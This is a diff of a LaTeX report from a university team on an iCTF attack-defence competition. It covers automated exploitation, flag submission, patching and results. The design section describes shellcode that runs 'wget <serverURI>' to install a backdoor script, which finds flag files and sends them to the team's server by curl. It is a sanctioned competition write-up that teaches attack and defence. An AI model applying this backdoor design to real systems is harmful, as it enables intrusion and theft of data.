@@ -24,6 +24,15 @@
 \usepackage[english]{babel}
 \usepackage{sectsty}
 \usepackage{url, lipsum}
+\usepackage{hyperref}
+
+\hypersetup{
+	colorlinks,
+	citecolor=black,
+	filecolor=black,
+	linkcolor=black,
+	urlcolor=black
+}
 
 \newcommand{\HRule}[1]{\rule{\linewidth}{#1}}
 \onehalfspacing
@@ -100,14 +109,14 @@ Therefore our approach in regards to the list above involves a focus on exploiti
 % Design
 %-------------------------------------------------------------------------------
 \addcontentsline{toc}{section}{Design}
-\section*{Design}
+\section*{Design and Implementation}
 Our design considers the following assumptions we made about the game server:
 
 \begin{enumerate}
 	\item There will be at \textbf{least} one buffer overflow that allows us to inject the shell code that is equivalent in accomplishing the following two functions:
 	\begin{itemize}
 		\item \texttt{wget <serverURI>} - This allows us to install the malicious backdoor on the victim machine
-		\item \texttt{./findflags.sh} - This allows us to immediately begin running the script after installation
+		\item \texttt{./backdoor.sh} - This allows us to immediately begin running the script after installation
 	\end{itemize}
 	\item We assume flags are being stored, read, and write in the directory: \\\\ \texttt{/opt/ctf/<some\_game\_service>/rw/} \\\\
 	This assumption is made with the statement that all game servers will be similar with each other, including our own. 
@@ -117,32 +126,59 @@ Our design considers the following assumptions we made about the game server:
 
 \noindent We first define our offensive approach. Using the iCTF library provided, we built on top of the existing functions to create custom scripts that automated many tasks that gave us an advantage such as auto exploiting services and auto submitting flags. One major goal of our attack strategy was to develop a method to steal flags directly from the victim file system. This can be achieved by successfully exploiting a buffer overflow attack that will trigger a chain of events, beginning with the injection of a piece of shellcode. This shellcode will contain instructions to install a malicious backdoor program (binary format) on their machine and will also run the installed binary. The result would ideally be the stealing of flags directly from the file system and sending it back to our server which would also double as an automatic service to submit the flags received. This component of our strategy which we dub "the backdoor flag monitor" consists of two separate parts, the server and the flag monitoring program, that coordinate with each other achieve the goal of "direct" flag stealing. \\
 
-\noindent The server has three primary functions. It will first and foremost serve the shellcode request for our \texttt{findflag.sh} script and trigger an install of the program on the victim machine. The second function it has is to listen on a port to be decided and parse HTTP GET URI of the form:\\\\
-$<host>:<port>/flag_{1}/flag_{2}/.../flag_{n}$\\\\ where $0 < flag_i \leq n$ depending on how many files are written to by the master server at every three minute interval. Thirdly, after parsing the URI in the GET request, the server submits the list of flags received to the master server. An important thing to note is that these flags submitted may or may not be correct. This is due to an unknown nature of why multiple files in the directory in which the flags are updated are written to or modified. Because of this behavior, we cannot completely rely on the value of the "most updated file" and rather decide to approach the problem by submitting a set of probable flags. The implementation of this approach is defined in our flag monitoring program, which we will dub \texttt{"findflag.sh"}.\\
+\noindent The server has three primary functions. It will first and foremost serve the shellcode request for our \texttt{backdoor.sh} script and trigger an install of the program on the victim machine. The second function it has is to listen on a port to be decided and parse HTTP GET URI of the form:\\\\
+$<host>:<port>/flag_{1}/flag_{2}/.../flag_{n}$\\\\ where $0 < flag_i \leq n$ depending on how many files are written to by the master server at every three minute interval. Thirdly, after parsing the URI in the GET request, the server submits the list of flags received to the master server. An important thing to note is that these flags submitted may or may not be correct. This is due to an unknown nature of why multiple files in the directory in which the flags are updated are written to or modified. Because of this behavior, we cannot completely rely on the value of the "most updated file" and rather decide to approach the problem by submitting a set of probable flags. The implementation of this approach is defined in our flag monitoring program, which we will dub \texttt{"backdoor.sh"}.\\
 
-\noindent The malicious \texttt{findflag.sh} works only if assumptions \textbf{(1)} or \textbf{(2)} apply. The program, placed on the victim server, was designed with the knowledge that we've acquired exploring our own server and operates by periodically (every 3 minutes) executing the command \texttt{find /opt/ctf/ -name rw -type d 2>/dev/null}, which will return a list of the most recently updated files in existing \texttt{/rw/} directories that are within \texttt{/opt/ctf/}. The reason why we read a set of files as opposed to simply storing the most recently touched file was due to some unexplained behaviors by the Gamebot/Scriptbot. What had occurred previously was that for an unknown reason, multiple files of a single service would be updated, and because of this behavior, there was no known solution that we had that could pinpoint the correct file to use. Instead we opted to go towards a brute force method described previously. After obtaining the set of the most recently updated files within the past three minutes, the next step consists of the construction of a HTTP GET request which will contain the URI with all the flags appended, with each flag separated by '/'. The packet is then sent through the use of \texttt{curl} and handled by the server.\\
+\noindent The malicious \texttt{backdoor.sh} works only if assumptions \textbf{(1)} or \textbf{(2)} apply. The program, placed on the victim server, was designed with the knowledge that we've acquired exploring our own server and operates by periodically (every 3 minutes) executing the command \texttt{find /opt/ctf/ -name rw -type d 2>/dev/null}, which will return a list of the most recently updated files in existing \texttt{/rw/} directories that are within \texttt{/opt/ctf/}. The reason why we read a set of files as opposed to simply storing the most recently touched file was due to some unexplained behaviors by the Gamebot/Scriptbot. What had occurred previously was that for an unknown reason, multiple files of a single service would be updated, and because of this behavior, there was no known solution that we had that could pinpoint the correct file to use. Instead we opted to go towards a brute force method described previously. After obtaining the set of the most recently updated files within the past three minutes, the next step consists of the construction of a HTTP GET request which will contain the URI with all the flags appended, with each flag separated by '/'. The packet is then sent through the use of \texttt{curl} and handled by the server.\\
 
 %Still need to add defensive part
-\noindent Our initial approached to defensive automation was focused from the network standpoint. We had originally planned to design a tool that would lie between the services and the network, similar to a firewall. We had planned to use this tool to intercept inputs and payloads before forwarding them into the application, monitor traffic and report those that were suspicious. However after several discussions and more research on the game server, it was decided this was infeasible for several reasons. First and foremost had to do with the way the network was set up, namely, NAT was enabled. This made it extremely difficult to differentiate the source and destination of requests and responses. Another obstacle we encountered were potential race conditions that we would need to win every single time. While true that we could theoretically sniff the network, sanitizing inputs would be difficult in this manner as we must not only run a program to sanitize the input, we also have to construct the "cleaned" payload and then forward that to the service before the original payload reaches it. Examples of such difficulties made us switch directions regarding defense, in particular focus on patching the services themselves. \\
+\noindent Our initial approach to defensive automation was focused from the network standpoint. We had originally planned to design a tool that would lie between the services and the network, similar to a firewall. We had planned to use this tool to intercept inputs and payloads before forwarding them into the application, monitor traffic and report those that were suspicious. However after several discussions and more research on the game server, it was decided this was infeasible for several reasons. First and foremost had to do with the way the network was set up, namely, NAT was enabled. This made it extremely difficult to differentiate the source and destination of requests and responses. Another obstacle we encountered were potential race conditions that we would need to win every single time. While true that we could theoretically sniff the network, sanitizing inputs would be difficult in this manner as we must not only run a program to sanitize the input, we also have to construct the "cleaned" payload and then forward that to the service before the original payload reaches it. Examples of such difficulties made us switch directions regarding defense, in particular focus on patching the services themselves. \\
 
 % Vishnu -- James -- Please write here about your patch
+\noindent Before we could patch any of the files we needed to be have the ability to restore them in case we brought down the service. We also needed required the ability to edit a file and test it before we deployed the patch. To accomplish this, we wrote a \texttt{backup.py} script that could be run from the command line or by other Python scripts. 
+This script automatically made two back ups. One named \texttt{<name>\_backup} that was to not be changed and one named \texttt{<name>\_patched} that was meant to be changed. If the option was specified, it also would execute the command \texttt{chown} so the service would not be down when it switched to the patched file.\\\\
+
+\noindent Depending on which language the service was coded in or formatted, we had different approaches to patch them.\\
+
+%c patches
+%python patches
+%web patches 
+%binary patches
+\noindent To patch the binary files, we first had to know what was wrong with them. To figure this out we used objdump to get the assembly and .rodata. We first looked at the .rodata to see if there was anything easily identifiable as input for a vulnerability. Then we used a tool that gave us a view of the c files logic (where if statements were). Once we identified a vulnerability, we were able to use the objdump to identify what hex needed to be changed in the elf file. Then we opened the elf file using vim. We used the command \texttt{:\%!xxd} to convert the elf to readable hex, changed the hex we had identified in the objdump, and used \texttt{:\%!xxd -r} to convert it back to an ELF file. We successfully did this on the test server.
+
+\addcontentsline{toc}{section}{Game Day Implementation}
+\section*{Game Day Implementation}
+The team assumed that the game day server would be similar to the example servers that were set up. This meant that the we could automate those vulnerabilities for the game day and get points very quickly.
+The team also knew not everything would be exactly the same, so the scripts that utilized configuration files were created so that a single change could be made and affect all the relating files.\\
+
+\noindent A \texttt{exploit\_and\_submit} script was made to run as a \texttt{cronjob} every minute. This script uses ConfigParser to parse data from the \texttt{config} file provided, which contains information such as the number of services and vulnerabilities. Activated services are placed in a dictionary structure at the top of the script which define which ones to exploit. 
+By default, service3 is for web because it needs a different configuration of commands to be executed to be exploited, In the current submission we have, service4 was added with the goal of automating the backdoor deployment by exploiting the service \texttt{backup\_c.c}, which we knew contained a command injection vulnerability. This script replaces keywords like <port>, and <hostname> among others, and automatically opens up a connection with the enemy teams. Exploits are then automatically performed by the script and the acquired flags are trimmed and submitted independently for each active service. The flags and successful/unsuccessful attempts are then logged into 2 files text files with a time stamp appended at the end.
 
 
+\noindent The entire source code of all the tools used are hosted on Github at \url{https://github.com/theskullcrusher/codeyoloco} in a private repository with Professor Adam Doup\'e added as a collaborator. A Python library with basic setup and requirements files were made available such that additional necessities could be installed into the system as a library whose functions could be imported in an interactive Python (iPython) shell. From there, aggregating the iCTF module's smaller functions into frequently used bigger modules were made possible. 
+A \texttt{setup\_environment.sh} script is included to setup powerful shells, virtual environment, git, and other required tools to speed up server configurations by the time of first login. The automation scripts and supporting functions are inside /codeyoloco directory. You will find the \texttt{login}, \texttt{config} and \texttt{exploit\_and\_submit} Python files here. Running \texttt{login.py} after setting the \texttt{config} to the needed values will generate \texttt{root\_ssh.sh} and \texttt{ctf\_ssh.sh} that allow for rapid login to our game server.
+Please refer the various \texttt{readme}'s available in the Github for more details on installation and example code snippets on it's use.
 
 
 \addcontentsline{toc}{section}{Results}
 \section*{Results}
+We ranked 3rd overall at the end of the CTF, but we for sure think we could have done better. Our automation actually helped us not waste time on flag capturing and submission once the vulnerability was detected but we focused a little bit more on patching the services rather than everyone focusing on finding and exploiting more. This slowed us down, along with the issues that we faced in patching the services that put them down, resulting in additional loss points. Our key weapon was the backdoor service and we successfully broke into a couple of machines to install the backdoor there too. One thing we failed to do is directory traversal across all services to get flags, which could have helped us get 1000 points every round for the unexploited c service. But, unfortunately we faced some issues with flags being pushed out of the vulnerable system, which was not anticipated and that resulted in this attempt not succeeding. Even then, we are pretty proud of pursuing this approach which would have been a one-for-all solution for the CTF Game. Our automation tool working out with minimal effort ensured us the 3rd position even after we had a lot of downtime on our own services.
 
+\addcontentsline{toc}{section}{Future Improvements}
+\section*{Future Improvements}
+We made a pretty good overall effort considering our approach, the difficulties we faced and the assumptions we had to make. Having a better idea now, we do have a few improvements that could be worked upon:
+\begin{enumerate}
+	\item Establishing a better method of communication between teammates would have made dividing up teamwork more efficient. Communication between members of the team oftentimes was chaotic and unorganized in our competitive atmosphere, especially when our services began going down. Instead of frantically calling teammates over, next time we know to have a more robust monitoring system (perhaps automated logs) that will aid in notifying us when our services are down, and to immediately patch them without having to call out to the patching team.
+	\item After verifying that our proof of concept backdoor flag stealer was indeed viable, plenty more could be added to improve it. One of the most important things we could have improved on was making the tool more configurable. One of the earlier troubles we had installing the backdoor on other machines was the fact that we needed to manually reconfigure many of the variables such as file path and IP addresses among others. If we could dynamically change those settings in real time, the deployment time could have been halved.
+	\item Rather than giving up on our previous "sniffer" idea, a separate team could have continued working on it as a secondary project. Having the ability to monitor our own network have been extremely beneficial for defensive reasons. By being able to check incoming and outgoing packets and inspecting their payloads, our defense team would have an easier time patching services as the insights of knowing what kind of vulnerabilities other teams are trying to exploit give us clues as to where the vulnerabilities are in the services attacked.
+\end{enumerate}	
+	
 \addcontentsline{toc}{section}{Conclusion}
-\section*{Conclusion}
+\section*{Conclusion}	
+Ultimately, this CTF was both an enjoyable and intellectually stimulating exercise. When choosing a direction for our project, we explored many different possibilities before finally settling on our final design. These ideas included a local reflector to filter malicious traffic, a network sniffer on opposing team servers, and other similar variations. Trying all these gave us a good feel for which types of attacks are feasible and which are not, and these lessons inspired our final design - an automated exploit tool coupled with a remote backdoor.\\
+Trying to make our project work in the real competition proved to be very exciting. Of course, the things did not work quite as well as we had hoped, but we learned a lot from it. The file system was structured differently than on the practice server, which initially made the backdoor fail. Moreover, the patching team accidentally shut down our services for a short period, resulting in the loss of points. Overall, though, the project was a success. The automated submission tool worked nearly to perfection, we were able to patch two of our services fairly quickly, and the backdoor was able to be run in the end (though at that point most opposing team servers had been patched). Of these, the most satisfying success was that the backdoor service did indeed prove to be a viable attack. This was always a question in our mind, as we were sort of coding blind, without a solid idea of how things would look on the real server.\\
 
-
-
-
-
-
-
-
+\noindent Most important to us personally, we managed to organize a group of seven people in a very high-pressure environment to work together and place 3rd overall. As this was the first time most of us had ever participated in a CTF, this was a very proud moment, and we are quite satisfied with the achievement. We are confident that the knowledge and experience gained through this project will be valuable as many of us go on to pursue careers in security.
 
 \end{document}
 
